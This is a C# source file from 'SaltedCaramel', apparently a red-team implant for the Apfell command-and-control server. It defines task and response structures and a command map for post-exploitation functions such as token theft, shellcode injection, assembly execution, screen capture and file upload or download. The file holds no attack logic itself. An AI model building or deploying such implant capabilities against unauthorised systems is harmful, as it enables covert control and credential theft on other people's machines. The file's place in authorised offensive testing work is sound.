using System.Text;
using System.Collections.Generic;

namespace SaltedCaramel
{
    namespace Tasks
    {
        /// <summary>
        /// Struct for formatting task output or other information to send back
        /// to Apfell server
        /// </summary>
        public struct SCTaskResp
        {
            public string response;
            public string id;

            /// <summary>
            /// Constructor for a SCTaskResp.
            /// </summary>
            /// <param name="id">Identifier for the task it's responding to.</param>
            /// <param name="response">Plaintext of the data to send.</param>
            public SCTaskResp(string id, string response)
            {
                this.response = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(response));
                this.id = id;
            }
        }

        /// <summary>
        /// A task to assign to an implant
        /// </summary>
        public class SCTask
        {
            /// <summary>
            /// The command passed by Apfell, such as "mv".
            /// </summary>
            public string command { get; set; }
            /// <summary>
            /// The parameters passed with the task given by
            /// Apfell. e.g., given "mv" command, @params
            /// could be "file1 file2"
            /// </summary>
            public string @params { get; set; }
            /// <summary>
            /// ID of the task.
            /// </summary>
            public string id { get; set; }
#if (DEBUG)
            public string status { get; set; }
            public string message { get; set; }
#else
        internal string status { get; set; }
        internal string message { get; set; }
#endif

            /// <summary>
            /// TaskMap is responsible for tracking what modules
            /// are loaded into the agent at any one time.
            /// </summary>
            public static Dictionary<string, string> TaskMap = new Dictionary<string, string>()
            {
                { "cd", "ChangeDir" },
                { "download", "Download" },
                { "execute_assembly", "ExecAssembly" },
                { "exit", "Exit" },
                { "jobs", "Jobs" },
                { "jobkill", "Jobs" },
                { "kill", "Kill" },
                { "ls", "DirectoryList" },
                { "make_token", "Token" },
                { "ps", "ProcessList" },
                { "powershell", "Powershell" },
                { "rev2self", "Token" },
                { "run", "Proc" },
                { "screencapture", "ScreenCapture" },
                { "shell", "Proc" },
                { "shinject", "Shellcode" },
                { "sleep", "Sleep" },
                { "spawn", "Spawn" },
                { "steal_token", "Token" },
                { "upload", "Upload" }
            };

            /// <summary>
            /// Instantiate an SCTask instance based
            /// on information provided by the Apfell
            /// server.
            /// </summary>
            /// <param name="command">Command to execute, such as "mv"</param>
            /// <param name="params">Parameters to go with the command.</param>
            /// <param name="id">ID of the task, provided by Apfell</param>
            public SCTask(string command, string @params, string id)
            {
                this.command = command;
                this.@params = @params;
                this.id = id;
            }

        }
    }
}